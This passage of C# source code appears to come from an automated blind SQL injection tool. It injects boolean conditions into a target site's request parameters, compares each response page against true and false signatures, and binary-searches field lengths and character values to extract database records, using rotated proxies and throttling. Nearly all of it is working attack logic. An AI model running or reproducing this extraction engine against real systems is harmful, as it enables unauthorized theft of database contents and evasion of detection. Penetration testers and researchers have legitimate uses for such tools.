			retVal.Name = KeyName;
			//TODO: We should escape this with apostrophes most likely
			retVal.Value = KeyValueBuilder.ToString();
			retVal.OutputValue = KeyOutputValueBuilder.ToString();


			return retVal;
		}
		// }}}

		// {{{ IterateIntegerPrimaryKey
		private GlobalDS.PrimaryKey IterateIntegerPrimaryKey(string TableName, string KeyName, GlobalDS.PrimaryKey CurrentPrimaryKey)
		{
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);

			if (CurrentPrimaryKey.Name == KeyName)
			{
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.IntegerPrimaryKeyValue(KeyName, TableName, CurrentPrimaryKey.Value)));
			}
			else
			{	
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.IntegerPrimaryKeyValue(KeyName, TableName)));
			}

			// Is there a way to force this to be numeric?!
			long Result = RecursiveSearch(1,0,CurrentVector.ToString());

			GlobalDS.PrimaryKey retVal = new GlobalDS.PrimaryKey();
			retVal.Name = KeyName;
			retVal.Value = Result.ToString();
			retVal.OutputValue = Result.ToString();

			return retVal;
		}
		// }}}

		// {{{ GetRecord
		private Hashtable GetRecord(string TableName, GlobalDS.Field[] Columns, GlobalDS.PrimaryKey pk)
		{
			int ColumnCounter;
			Hashtable retVal = new Hashtable();

			for (ColumnCounter = 0; ColumnCounter < Columns.Length; ColumnCounter++)
			{
				DictionaryEntry de = GetFieldData(TableName, Columns[ColumnCounter], pk);
				retVal.Add(de.Key, de.Value);
			}

			return retVal;
		}
		// }}}

		// {{{ GetFieldData
		private DictionaryEntry GetFieldData(string TableName, GlobalDS.Field Column, GlobalDS.PrimaryKey pk)
		{
			DictionaryEntry retVal = new DictionaryEntry();

			retVal.Key = Column.FieldName;
			retVal.Value = string.Empty;

			if (Column.FieldName.Equals(pk.Name))
			{
				retVal.Value = pk.Value;
				return retVal;
			}

			if (true == TestNull(Column.FieldName, TableName, pk)) 
			{ //retVal.Value = null; 
			}
			else
			{

				switch (Column.DataType)
				{
					case SqlDbType.BigInt:
						goto case SqlDbType.Int;
					case SqlDbType.SmallInt:
						goto case SqlDbType.Int;
					case SqlDbType.TinyInt:
						goto case SqlDbType.Int;
					case SqlDbType.Int:
						retVal.Value = OpenEndedIntegerSearch(Column.FieldName, TableName, pk);
						break;
					case SqlDbType.NChar:
						goto case SqlDbType.VarChar;
					case SqlDbType.Char:
						goto case SqlDbType.VarChar;
					case SqlDbType.NVarChar:
						goto case SqlDbType.VarChar;
					case SqlDbType.Text:
						goto case SqlDbType.VarChar;
					case SqlDbType.NText:
						goto case SqlDbType.VarChar;
					case SqlDbType.VarChar:
						retVal.Value = GetFieldDataVarChar(Column.FieldName, TableName, pk);
						break;
					case SqlDbType.Decimal:
						goto case SqlDbType.UniqueIdentifier;
					case SqlDbType.DateTime:
						goto case SqlDbType.UniqueIdentifier;
					case SqlDbType.Money:
						goto case SqlDbType.UniqueIdentifier;
					case SqlDbType.Float:
						goto case SqlDbType.UniqueIdentifier;
					case SqlDbType.Real:
						goto case SqlDbType.UniqueIdentifier;
					case SqlDbType.SmallDateTime:
						goto case SqlDbType.UniqueIdentifier;
					case SqlDbType.SmallMoney:
						goto case SqlDbType.UniqueIdentifier;
					case SqlDbType.Timestamp:
						goto case SqlDbType.UniqueIdentifier;
					case SqlDbType.UniqueIdentifier:
						retVal.Value = GetConvertedFieldData(Column.FieldName, TableName, pk);	
						break;
					case SqlDbType.Bit:
						retVal.Value = GetBitField(Column.FieldName, TableName, pk);	
						break;
					case SqlDbType.Image:
						goto case SqlDbType.VarBinary;
					case SqlDbType.Binary:
						goto case SqlDbType.VarBinary;
					case SqlDbType.VarBinary:
						// TODO: Figure out how to support this!
						//retVal.Value = null;
						break;
				}
			}

			return retVal;
		}
		// }}}

		// {{{ TestNull
		private bool TestNull(string FieldName, string TableName, GlobalDS.PrimaryKey pk)
		{
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndIsNullWrapper(_PluginData.SelectValueForGivenPrimaryKey(FieldName, TableName, pk)));

			_AttackParams[_VectorName] = CurrentVector + _VectorPostBuffer;

			string ResultPage;

			WebProxy Proxy = RotatedProxy();

			ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, Proxy, _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _ParentOutput);
			if (_Options.Throttle > 0) Thread.Sleep(_Options.Throttle);

			double[] resSig = ParsePage.GetHtmlPageSignature(ResultPage, _Options.Delimiter);

			CurrentVector.Remove(CurrentVector.Length - 1, 1);

			if (ParsePage.CompareSignatures(TruePageSignature, resSig, TrueFilter, _Options.Tolerance))
			{
				return true;
			}
			else if (ParsePage.CompareSignatures(FalsePageSignature, resSig, FalseFilter, _Options.Tolerance))
			{
				return false;
			}

			return true;
		}
		// }}}

		// {{{ OpenEndedIntegerSearch
		private long OpenEndedIntegerSearch(string FieldName, string TableName, GlobalDS.PrimaryKey pk)
		{
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndGreaterThanEqualWrapper(_PluginData.SelectValueForGivenPrimaryKey(FieldName, TableName, pk)));
			CurrentVector.Append(" 0");

			_AttackParams[_VectorName] = CurrentVector + _VectorPostBuffer;

			string ResultPage;

			WebProxy Proxy = RotatedProxy();

			ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, Proxy, _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _ParentOutput);
			if (_Options.Throttle > 0) Thread.Sleep(_Options.Throttle);

			double[] resSig = ParsePage.GetHtmlPageSignature(ResultPage, _Options.Delimiter);

			CurrentVector.Remove(CurrentVector.Length - 1, 1);


			if (ParsePage.CompareSignatures(TruePageSignature, resSig, TrueFilter, _Options.Tolerance))
			{
				return RecursiveSearch(1, 0, CurrentVector.ToString());
			}
			else if (ParsePage.CompareSignatures(FalsePageSignature, resSig, FalseFilter, _Options.Tolerance))
			{
				return RecursiveSearch(-1, 0, CurrentVector.ToString());
			}
			else
			{
				_ParentOutput("Uh oh.. Error page maybe?");
				return 0;
			}
		}
		// }}}

		// {{{ GetBitField
		private int GetBitField(string FieldName, string TableName, GlobalDS.PrimaryKey pk)
		{
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndEqualWrapper(_PluginData.SelectValueForGivenPrimaryKey(FieldName, TableName, pk)));
			CurrentVector.Append(" 0");

			_AttackParams[_VectorName] = CurrentVector + _VectorPostBuffer;

			string ResultPage;

			WebProxy Proxy = RotatedProxy();

			ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, Proxy, _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _ParentOutput);
			if (_Options.Throttle > 0) Thread.Sleep(_Options.Throttle);

			double[] resSig = ParsePage.GetHtmlPageSignature(ResultPage, _Options.Delimiter);

			if (ParsePage.CompareSignatures(TruePageSignature, resSig, TrueFilter, _Options.Tolerance))
			{
				return 0;
			}
			else if (ParsePage.CompareSignatures(FalsePageSignature, resSig, FalseFilter, _Options.Tolerance))
			{
				return 1;
			}
			else
			{
				_ParentOutput("Uh oh.. Error page maybe?");
				return -1;
			}
		}
		// }}}

		// {{{ GetFieldDataChar
		private string GetFieldDataChar(string FieldName, string TableName, GlobalDS.PrimaryKey pk)
		{
			StringBuilder CurrentVector = new StringBuilder();
			StringBuilder FieldBuilder = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.SelectLengthOfValueForGivenPrimaryKey(FieldName, TableName, pk)));

			long Size = RecursiveSearch(1,0,CurrentVector.ToString());

			CurrentVector = new StringBuilder();

			for (long AscCounter = 1; AscCounter <= Size; AscCounter++)
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.SelectCharacterValueForGivenPrimaryKey(AscCounter, FieldName, TableName, pk)));
				FieldBuilder.Append(Convert.ToChar( RecursiveSearch( 1,128, CurrentVector.ToString() )));
			}	

			return FieldBuilder.ToString();;
		}
		// }}}

		// {{{ GetFieldDataVarChar
		private string GetFieldDataVarChar(string FieldName, string TableName, GlobalDS.PrimaryKey pk)
		{

			StringBuilder FieldBuilder = new StringBuilder();
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.SelectLengthOfValueForGivenPrimaryKey(FieldName, TableName, pk)));

			long Size = RecursiveSearch(1,0,CurrentVector.ToString());

			for (long AscCounter = 1; AscCounter <= Size; AscCounter++)
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.SelectCharacterValueForGivenPrimaryKey(AscCounter, FieldName, TableName, pk)));
				FieldBuilder.Append(Convert.ToChar( RecursiveSearch( 1,128, CurrentVector.ToString() )));
			}	

			return FieldBuilder.ToString();
		}
		// }}}

		// {{{ GetConvertedFieldData
		private string GetConvertedFieldData(string FieldName, string TableName, GlobalDS.PrimaryKey pk)
		{

			StringBuilder FieldBuilder = new StringBuilder();
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.SelectLengthOfConvertedRecordValue(FieldName, TableName, pk)));

			long Size = RecursiveSearch(1,0,CurrentVector.ToString());

			for (long AscCounter = 1; AscCounter <= Size; AscCounter++)
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.SelectCharacterValueForConvertedRecordValue(AscCounter, FieldName, TableName, pk)));
				FieldBuilder.Append(Convert.ToChar( RecursiveSearch( 1,128, CurrentVector.ToString() )));
			}	

			return FieldBuilder.ToString();
		}
		// }}}

		// {{{ CheckZero
		private bool CheckZero(string CurrentVector)
		{
			int GT_Loc = CurrentVector.LastIndexOf(">");

			string NewVector = CurrentVector.Substring(0, GT_Loc - 1) + "= 0 ";

			_AttackParams[_VectorName] = NewVector + _VectorPostBuffer;

			string ResultPage;

			WebProxy Proxy = RotatedProxy();

			ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, Proxy, _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _ParentOutput);
			if (_Options.Throttle > 0) Thread.Sleep(_Options.Throttle);

			double[] resSig = ParsePage.GetHtmlPageSignature(ResultPage, _Options.Delimiter);

			if (ParsePage.CompareSignatures(TruePageSignature, resSig, TrueFilter, _Options.Tolerance))
			{
				_ParentOutput("I read this as true");
				return true;
			}

			_ParentOutput("I read this as false");
			return false;
		}
		// }}}

		// {{{ RecursiveSearch
		private long RecursiveSearch(long LowerBound, long UpperBound, string CurrentVector)
		{
			long Partition;
			bool LastRun = false;

			if (UpperBound == 0)
			{
				if (LowerBound == 1)
				{
					bool cz = CheckZero(CurrentVector);
					if (cz)
					{
						return 0L; 
					}
				}

				Partition = LowerBound * 2;
			}
			else if (LowerBound + 1 < UpperBound)
			{
				long trash;
				Partition = Math.DivRem((UpperBound - LowerBound), 2, out trash) + LowerBound;
			}
			else
			{
				Partition = LowerBound;
				LastRun = true;			
			}

			_AttackParams[_VectorName] = CurrentVector + Partition + _VectorPostBuffer;

			string ResultPage;
			WebProxy Proxy = RotatedProxy();

			ResultPage = httpConnect.PageRequest(_TargetURL, _AttackParams, Proxy, _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _ParentOutput);
			if (_Options.Throttle > 0) Thread.Sleep(_Options.Throttle);

			double[] resSig = ParsePage.GetHtmlPageSignature(ResultPage, _Options.Delimiter);

			_ParentOutput("Recursive Search: " + _AttackParams[_VectorName]);

			if (ParsePage.CompareSignatures(TruePageSignature, resSig, TrueFilter, _Options.Tolerance))
			{
				//			_ParentOutput("Recursive True");
				if (LastRun) return UpperBound;
				return RecursiveSearch(Partition, UpperBound, CurrentVector);
			}
			else if (ParsePage.CompareSignatures(FalsePageSignature, resSig, FalseFilter, _Options.Tolerance))
			{
				//			_ParentOutput("Recursive False");
				if (LastRun) return LowerBound;
				return RecursiveSearch(LowerBound, Partition, CurrentVector);
			}
			else
			{
				_ParentOutput("Recursive Unknown");
				_ParentOutput(ResultPage);
				//				_ParentOutput(FalsePageSignature);
				//				_ParentOutput("==== v u ====");
				//				_ParentOutput(resSig);
				throw new UnrecognizedPageException("Unrecognized Page encountered during recursive search.");
			}

		}
		// }}}

	}
}
